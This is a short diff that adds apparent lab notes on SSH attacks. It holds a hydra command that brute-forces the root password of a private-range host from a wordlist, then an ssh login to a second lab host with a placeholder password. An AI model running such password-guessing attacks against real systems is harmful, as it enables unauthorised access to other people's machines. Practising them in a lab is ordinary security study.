@@ -1,0 +1,6 @@
+Automated attack
+hydra -l root -P testlist.txt ssh://192.168.56.101
+
+Direct SSH login / attack
+ssh casper@192.168.56.102
+casper@192.168.56.102's password: YourPassword
